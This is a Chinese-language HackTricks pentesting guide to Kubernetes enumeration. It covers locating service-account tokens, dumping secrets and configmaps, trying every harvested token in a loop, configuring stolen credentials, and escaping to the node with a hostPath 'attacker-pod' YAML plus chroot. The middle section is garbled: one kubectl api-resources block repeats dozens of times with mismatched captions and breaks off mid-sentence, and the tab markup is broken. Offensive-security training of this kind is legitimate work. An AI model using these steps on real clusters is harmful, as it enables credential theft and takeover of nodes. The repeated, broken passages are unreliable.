# Kubernetes枚举

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的账号 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## Kubernetes令牌

如果您已经获得对某台机器的访问权限，用户可能可以访问某些Kubernetes平台。令牌通常位于由**环境变量`KUBECONFIG`**或**`~/.kube`**指向的文件中。

在此文件夹中，您可能会找到配置文件，其中包含连接到API服务器的**令牌和配置**。在此文件夹中，您还可以找到一个包含先前检索到的信息的缓存文件夹。

如果您已经在Kubernetes环境中的一个pod中获得了访问权限，则还有其他地方可以找到令牌和有关当前K8环境的信息：

### 服务账户令牌

在继续之前，如果您不知道Kubernetes中的服务是什么，请**点击此链接并至少阅读有关Kubernetes架构的信息**。

来自Kubernetes [文档](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)：

_"当您创建一个pod时，如果您没有指定服务账户，它将自动分配给同一命名空间中的_默认_服务账户。"_

**ServiceAccount**是由Kubernetes管理的对象，用于为在pod中运行的进程提供身份。\
每个服务账户都有一个与之相关的密钥，该密钥包含一个令牌。这是一个JSON Web Token（JWT），用于在两个参与方之间安全地表示声明的方法。

通常，**一个**目录中：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

包含以下文件：

* **ca.crt**：用于检查Kubernetes通信的CA证书
* **namespace**：指示当前命名空间
* **token**：包含当前pod的**服务令牌**。

现在您已经获得了令牌，可以在环境变量**`KUBECONFIG`**中找到API服务器。要获取更多信息，请运行`(env | set) | grep -i "kuber|kube`**`"`**

服务账户令牌由文件**sa.key**中的密钥签名，并由**sa.pub**验证。

**Kubernetes**上的默认位置：

* /etc/kubernetes/pki

**Minikube**上的默认位置：

* /var/lib/localkube/certs

### 热pod

_**热pod是**_包含特权服务账户令牌的pod。特权服务账户令牌是具有执行特权任务（如列出密钥、创建pod等）权限的令牌。

## RBAC

如果您不知道什么是**RBAC**，请**阅读本节**。

## 枚举备忘单

为了枚举K8s环境，您需要以下几点：

* 一个**有效的身份验证令牌**。在前一节中，我们看到了在哪里搜索用户令牌和服务账户令牌。
* Kubernetes API的**地址（_**https://host:port**_**）**。这通常可以在环境变量和/或kube配置文件中找到。
* **可选项**：用于验证API服务器的**ca.crt**。这可以在与令牌相同的位置找到。这对于验证API服务器证书很有用，但是使用`kubectl`的`--insecure-skip-tls-verify`或`curl`的`-k`，您将不需要此选项。

有了这些详细信息，您可以**枚举Kubernetes**。如果由于某种原因，**API可以通过Internet访问**，您可以直接从主机下载该信息并枚举平台。

然而，通常**API服务器位于内部网络中**，因此您需要通过受损的机器创建一个隧道，以便从您的机器访问它，或者您可以**上传**[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)**二进制文件**，或使用**`curl/wget/anything`**执行原始HTTP请求到API服务器。

### `list`和`get`动词之间的区别

使用**`get`**权限，您可以访问特定资产的信息（`kubectl`中的`describe`选项）API：
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
如果您拥有**`list`**权限，您可以执行API请求来列出一种类型的资产（`kubectl`中的`get`选项）：
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
如果您拥有**`watch`**权限，您可以执行API请求来监视资产：
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
他们打开了一个流连接，每当部署发生变化（或创建新的部署）时，就会返回完整的部署清单。

{% hint style="danger" %}
以下 `kubectl` 命令仅用于列出对象。如果要访问数据，需要使用 `describe` 而不是 `get`。
{% endhint %}

### 使用 curl

从容器内部，您可以使用多个环境变量：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
默认情况下，Pod可以通过域名`kubernetes.default.svc`访问`kube-api server`，并且您可以在`/etc/resolv.config`中看到kube网络，因为在这里您将找到kubernetes DNS服务器的地址（同一范围的“.1”是kube-api的终端节点）。
{% endhint %}

### 使用kubectl

有了令牌和API服务器的地址，您可以使用kubectl或curl按照以下指示访问它：

默认情况下，APISERVER使用`https://`模式进行通信。
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> 如果URL中没有`https://`，你可能会收到类似"Bad Request"的错误。

你可以在[**这里找到官方的kubectl备忘单**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)。以下各节的目标是以有序的方式呈现不同的选项，以枚举和理解你已经获得访问权限的新K8s。

要找到`kubectl`发送的HTTP请求，可以使用参数`-v=8`。

#### MitM kubectl - 代理化kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 当前配置

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

如果你成功窃取了一些用户的凭证，你可以使用类似以下的方式**在本地配置它们**：
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### 获取支持的资源

通过这些信息，您将了解可以列出的所有服务

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### 获取当前权限

{% tabs %}
{% tab title="kubectl" %}使用以下命令获取当前用户的权限：

```bash
kubectl auth can-i <verb> <resource>
```

例如，要检查当前用户是否有获取所有Pod的权限，可以运行以下命令：

```bash
kubectl auth can-i get pods --all-namespaces
```

如果用户具有该权限，将返回`yes`；否则，将返回`no`。
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

另一种检查权限的方法是使用工具：[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

您可以在以下链接中了解更多关于**Kubernetes RBAC**的信息：

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**一旦您知道您拥有的权限**，请查看以下页面以确定是否可以滥用这些权限来提升权限：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 获取其他角色

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### 获取命名空间

Kubernetes支持由同一物理集群支持的**多个虚拟集群**。这些虚拟集群被称为**命名空间**。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### 获取秘密

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

如果你能读取secrets，你可以使用以下命令获取与每个令牌相关的权限：
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### 获取服务账户

正如本页面开头所讨论的，当一个 Pod 运行时，通常会为其分配一个服务账户。因此，列出服务账户、它们的权限以及它们所在的位置可能会允许用户提升权限。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### 获取部署信息

部署信息指定需要运行的组件。
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### 获取Pods

Pods是实际运行的容器。
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### 获取服务

Kubernetes **服务**用于**在特定端口和IP上公开服务**（这将作为负载均衡器，用于提供服务的实际Pod）。这对于了解可以找到其他服务以尝试攻击的位置很有趣。

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### 获取节点

获取集群中配置的所有节点。

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### 获取DaemonSets

**DaemonSets** 允许确保集群中的所有节点（或所选节点）上运行特定的pod。如果删除DaemonSet，它管理的pod也将被删除。
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### 获取 cronjob

Cron 作业允许使用类似于 crontab 的语法安排启动一个将执行某些操作的 pod。
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}API接口{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### 获取configMap

configMap始终包含大量信息和配置文件，这些文件提供给在Kubernetes中运行的应用程序。通常，您可以找到许多用于连接和验证其他内部/外部服务的密码、秘密和令牌。
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% tab title="kubectl" %}

获取所有的资源类型：

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get --show-kind --ignore-not-found -n <namespace>
```

获取所有的资源实例：

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace>
```

获取所有的资源实例和详细信息：

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件：

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件：

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

获取所有的资源实例和 JSON 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

获取所有的资源实例和 YAML 格式的配置文件（包括未命名空间的资源）：

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

获取所有的资源实例和 JSON 格式的配置文件（包括未
```
k get all
```
{% endtab %}
{% endtabs %}

### **获取Pods的资源消耗情况**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### 从容器中逃脱

如果你能够创建新的容器，那么你可能能够从容器中逃脱到节点上。为了做到这一点，你需要使用一个yaml文件创建一个新的容器，切换到创建的容器，然后chroot到节点的系统中。你可以使用已经存在的容器作为yaml文件的参考，因为它们显示了现有的镜像和路径。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 如果您需要在特定节点上创建Pod，可以使用以下命令获取节点上的标签：
>
> `k get nodes --show-labels`
>
> 通常，kubernetes.io/hostname和node-role.kubernetes.io/master都是用于选择的好标签。
>
> [参考链接]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
>
> 然后，您可以创建attack.yaml文件。
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[原始的yaml源代码](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

之后，您创建了pod。
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
现在你可以按照以下步骤切换到创建的 pod：
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- bash # attacker-pod is the name defined in the yaml file
```
最后，您将chroot进入节点的系统
```bash
chroot /root /bin/bash
```
从以下来源获取的信息：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考资料

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
